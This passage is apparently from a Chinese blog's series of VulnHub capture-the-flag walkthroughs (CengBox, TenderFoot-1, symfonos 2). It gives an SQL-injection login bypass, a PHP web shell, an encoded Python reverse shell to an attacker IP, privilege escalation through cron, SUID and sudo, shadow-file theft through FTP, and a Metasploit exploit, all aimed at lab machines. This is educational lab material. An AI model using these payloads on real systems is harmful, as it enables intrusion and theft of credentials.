src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/06.png" alt="" /></p><p>使用gcc进行提权</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/07.png" alt="" /></p><p>查看sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/08.png" alt="" /></p><p>使用gcc进行提权</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/09.png" alt="" /></p><hr /><blockquote><p>Shell脚本提权与空格</p></blockquote><p>使用shell脚本进行sudo/suid提权时，参数中带有空格则需要使用引号</p><p>参考资料</p><blockquote><p><a href="https://www.hacknos.com/infosecwarrior-ctf-2020-03-walkthrough/">WalkThrough</a></p></blockquote><hr /><h1 id="cengbox"><a class="markdownIt-Anchor" href="#cengbox"></a> <a href="https://www.vulnhub.com/entry/cengbox-1,475/">CengBox</a></h1><p><code>2020/10/25 16:31:59</code></p><h2 id="寻找靶机ip-17"><a class="markdownIt-Anchor" href="#寻找靶机ip-17"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/00.png" alt="" /></p><h2 id="端口扫描-33"><a class="markdownIt-Anchor" href="#端口扫描-33"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -A -T5 192.168.1.104</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/01.png" alt="" /></p><h2 id="web路径扫描-16"><a class="markdownIt-Anchor" href="#web路径扫描-16"></a> Web路径扫描</h2><p><code>gobuster dir -u http://192.168.1.104 -w /usr/share/wordlists/dirb/big.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/02.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/03.png" alt="" /></p><h2 id="漏洞利用-33"><a class="markdownIt-Anchor" href="#漏洞利用-33"></a> 漏洞利用</h2><p>访问 <code>http://192.168.1.104/masteradmin/login.php</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/04.png" alt="" /></p><p>尝试SQL注入绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39; or 1#</span><br><span class="line">passwrod&#x3D;1</span><br></pre></td></tr></table></figure><p>绕过登录，跳转至 <code>http://192.168.1.104/masteradmin/upload.php</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/05.png" alt="" /></p><p>尝试上传shell.php，返回错误信息</p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/06.png" alt="" /></p><p>更改文件名为shell.php.ceng，上传成功</p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/07.png" alt="" /></p><p>WebShell的内容为 <code>&lt;?php @system($_GET[&quot;cmd&quot;]);?&gt;</code></p><p>WebShell存放路径为 <code>/uploads/shell.php.ceng</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/08.png" alt="" /></p><p>存在python3环境</p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/09.png" alt="" /></p><p>使用WebShell进行反弹Shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9908</span><br><span class="line">curl http:&#x2F;&#x2F;192.168.1.104&#x2F;uploads&#x2F;shell.php.ceng?cmd&#x3D;python3%20-c%20%22import%20os%2Csocket%2Csubprocess%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%27192.168.1.109%27%2C9908%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27&#x2F;bin&#x2F;bash%27%2C%27-i%27%5D%29%3B%22</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/10.png" alt="" /></p><h2 id="权限提升-33"><a class="markdownIt-Anchor" href="#权限提升-33"></a> 权限提升</h2><p>获取tty, 查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">uname -a</span><br><span class="line">cat &#x2F;etc&#x2F;*release</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/11.png" alt="" /></p><p>查看数据库信息<br /><code>cat /var/www/html/masteradmin/db.php</code><br />得到数据库账户信息 <code>root:SuperS3cR3TPassw0rd1!</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/12.png" alt="" /></p><p>进入数据库查看Web账户信息<br /><code>mysql -u root -pSuperS3cR3TPassw0rd1! -e 'select * from cengbox.admin;'</code><br />得到Web账户信息 <code>masteradmin:C3ng0v3R00T1!</code><br /><img src="/images/vulnhub_walkthrough_set/CengBox/img/13.png" alt="" /></p><p>查看账户信息<br /><code>cat /etc/passwd</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/14.png" alt="" /></p><p>尝试登入cengover账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh cengover@192.168.1.104</span><br><span class="line">C3ng0v3R00T1!</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/15.png" alt="" /></p><p>在pspy目录开启HTTP服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 9900&amp;</span><br></pre></td></tr></table></figure><p>下载并使用pspy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">curl -O http:&#x2F;&#x2F;192.168.1.109:9900&#x2F;pspy64</span><br><span class="line">chmod +x pspy64</span><br><span class="line">.&#x2F;pspy64&amp;</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/16.png" alt="" /></p><p>存在root的计划任务<br />查看脚本文件</p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/17.png" alt="" /></p><p>拥有写入权限<br />可以写入反弹Shell命令</p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/18.png" alt="" /></p><p>监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8087</span><br></pre></td></tr></table></figure><p>获取root权限</p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/19.png" alt="" /></p><hr /><p>参考资料</p><blockquote><p><a href="https://www.hacknos.com/cengbox-1-vulnhub-walkthrough/">WalkThrough</a></p></blockquote><hr /><h1 id="tenderfoot-1"><a class="markdownIt-Anchor" href="#tenderfoot-1"></a> <a href="https://www.vulnhub.com/entry/tenderfoot-1,581/">TenderFoot-1</a></h1><p><code>2020/10/28 21:29:04</code></p><h2 id="寻找靶机ip-18"><a class="markdownIt-Anchor" href="#寻找靶机ip-18"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/00.png" alt="" /></p><h2 id="端口扫描-34"><a class="markdownIt-Anchor" href="#端口扫描-34"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.1.108</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/01.png" alt="" /></p><h2 id="web路径扫描-17"><a class="markdownIt-Anchor" href="#web路径扫描-17"></a> Web路径扫描</h2><p><code>dirb http://192.168.1.108/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/02.png" alt="" /></p><h2 id="漏洞利用-34"><a class="markdownIt-Anchor" href="#漏洞利用-34"></a> 漏洞利用</h2><p>访问 <code>http://192.168.1.108/</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/03.png" alt="" /><br />提示需要进行路径枚举</p><p>查看源代码得到提示 <code>/robots.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/04.png" alt="" /></p><p><code>/robots.txt</code> 提示路径 <code>/hint</code><br />访问<code>/hint</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/05.png" alt="" /><br />存在HTML注释中存在Base32编码<br />解码结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> ____________________</span><br><span class="line">| N0thing Here!      |</span><br><span class="line">| Try something else!|</span><br><span class="line"> --------------------</span><br><span class="line">Enumerate more :)�</span><br></pre></td></tr></table></figure><p>继续枚举路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.1.108&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-1.0.txt</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/06.png" alt="" /></p><p>访问 <code>/fotocd</code><br />HTML注释中存在BrainFuck编码</p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/07.png" alt="" /></p><p>解码结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">JDk5OTkwJA&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Did you found username ?</span><br><span class="line">if yes:</span><br><span class="line">    Then you have cred. of one user, enter into user account </span><br><span class="line">    by ssh port. syntax:&#123;ssh username@IP&#125;</span><br><span class="line">if not:</span><br><span class="line">    Then enumerate more :)</span><br><span class="line">    G00D LUCK !</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -n &#39;JDk5OTkwJA&#x3D;&#x3D;&#39; | base64 -d</span><br><span class="line">$99990$</span><br></pre></td></tr></table></figure><p>继续枚举其他类型WEB文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.1.108&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-1.0.txt -x .html,.php,.css,.js</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/08.png" alt="" /></p><p>访问 <code>/entry.js</code><br />内容为 <code>monica</code></p><p>登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh monica@192.168.1.108</span><br><span class="line">$99990$</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/09.png" alt="" /></p><h2 id="权限提升-34"><a class="markdownIt-Anchor" href="#权限提升-34"></a> 权限提升</h2><p>得到提示信息</p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/10.png" alt="" /></p><p>访问 <code>/fotocd/0x0343548764</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/11.png" alt="" /></p><p>下载并解压ZIP文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.1.108&#x2F;fotocd&#x2F;0x0343548764&#x2F;joey.zip</span><br><span class="line">unzip joey.zip</span><br><span class="line">#9175</span><br></pre></td></tr></table></figure><p>得到两个文件: <code>gift.zip</code>, <code>note.txt</code><br />note.txt的内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Not this time DUDE!</span><br><span class="line"></span><br><span class="line">Just G00GLE and learn how to crack zip passwords :)</span><br><span class="line"></span><br><span class="line">you will learn new thing!</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>破解gift.zip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip gift.zip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u</span><br></pre></td></tr></table></figure><p>得到密码为 <code>h4ck3d</code></p><p>解压后得到 <code>gift.txt</code>，内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Hahaha! there is no gift !</span><br><span class="line">Your Bad Luck!</span><br><span class="line"></span><br><span class="line">But what happened if you don&#39;t get gift.</span><br><span class="line"></span><br><span class="line">Take a hint from my side, which may help you to solve this box further.</span><br><span class="line"></span><br><span class="line">I make a binary to get another user&#39;s shell,</span><br><span class="line">Just google, command for search&#x2F;find SUID or binaries and figure it out how to execute this binary.</span><br><span class="line"></span><br><span class="line">G00D LUCK! :)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>搜索SUID文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p>找到文件 <code>/opt/exec/chandler</code><br />执行后用户身份变为 <code>chandler</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/12.png" alt="" /></p><p>查看提示信息</p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/13.png" alt="" /></p><p>Base32解码的结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd:Y0uCr4ckM3</span><br></pre></td></tr></table></figure><p>SSH登入chandler账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh chandler@192.168.1.108</span><br><span class="line">Y0uCr4ckM3</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/14.png" alt="" /></p><p>进行sudo提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root &#x2F;usr&#x2F;bin&#x2F;ftp</span><br><span class="line">!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/15.png" alt="" /></p><hr /><blockquote><p>SUDO &amp; GID</p></blockquote><p>使用脚本切换用户身份时，只是简单地更换了UID与GID，并没有添加用户所属的groups，所以不能直接进行sudo提权而是需要使用SSH登入之后再提权</p><p>参考资料</p><blockquote><p><a href="https://www.infosecarticles.com/tenderfoot-vulnhub-walkthrough/">WalkThrough</a></p></blockquote><hr /><h1 id="symfonos-2"><a class="markdownIt-Anchor" href="#symfonos-2"></a> <a href="https://www.vulnhub.com/entry/symfonos-2,331/">symfonos 2</a></h1><p><code>2020/10/28 08:21:48</code></p><h2 id="寻找靶机ip-19"><a class="markdownIt-Anchor" href="#寻找靶机ip-19"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/00.png" alt="" /></p><h2 id="端口扫描-35"><a class="markdownIt-Anchor" href="#端口扫描-35"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.1.107</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/01.png" alt="" /></p><h2 id="web路径扫描-18"><a class="markdownIt-Anchor" href="#web路径扫描-18"></a> Web路径扫描</h2><p><code>dirb http://192.168.1.107/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/02.png" alt="" /></p><h2 id="漏洞利用-35"><a class="markdownIt-Anchor" href="#漏洞利用-35"></a> 漏洞利用</h2><p>收集smb信息<br /><code>enum4linux 192.168.1.107</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/03.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/04.png" alt="" /></p><p>目录/anonymous可以匿名访问，使用空账户即可登入<br />且获得用户名<code>aeolus</code>，<code>cronus</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/05.png" alt="" /></p><p>下载并查看<code>log.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/06.png" alt="" /></p><p>内容为smb.conf与proftpd.conf<br />smb的<code>/anonymous</code>路径对应<code>/home/aeolus/share/</code><br />ftp存在匿名访问</p><p>尝试匿名访问FTP服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.1068.1.107</span><br><span class="line">anonymous</span><br><span class="line">anonymous</span><br><span class="line">site cpfr &#x2F;var&#x2F;backups&#x2F;shadow.bak</span><br><span class="line">site cpto &#x2F;home&#x2F;aeolus&#x2F;share&#x2F;shadow.bak</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/07.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/08.png" alt="" /></p><p>通过smb服务获取shadow的备份文件</p><p>使用john破解Hash</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/09.png" alt="" /></p><p>得到账户信息<code>aeolus:sergioteamo</code></p><p>使用账户信息登入SSH</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/10.png" alt="" /></p><h2 id="权限提升-35"><a class="markdownIt-Anchor" href="#权限提升-35"></a> 权限提升</h2><p>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;*release</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/11.png" alt="" /></p><p>查看网络端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -antlp</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/12.png" alt="" /></p><p>目标对本地开放25，3306，8080端口</p><p>使用nc探测本地8080端口</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/13.png" alt="" /></p><p>本地8080端口存在Web服务</p><p>进行端口转发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-listen:1235,fork tcp-connect:localhost:8080 &amp;</span><br></pre></td></tr></table></figure><p>使用浏览器访问目标1235端口</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/14.png" alt="" /></p><p>使用<code>aeolus</code>账户进行登入</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/15.png" alt="" /></p><p>查询相关漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit librenms</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/16.png" alt="" /></p><p>使用MSF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit&#x2F;linux&#x2F;http&#x2F;librenms_addhost_cmd_inject</span><br><span class="line">set RHOST 192.168.1.107</span><br><span class="line">set RPORT 1235</span><br><span class="line">set USERNAME aeolus</span><br><span class="line">set PASSWORD sergioteamo</span><br><span class="line">set LHOST 192.168.1.103</span><br><span class="line">set LPORT 9999</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/17.png" alt="" /></p><p>获取tty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import 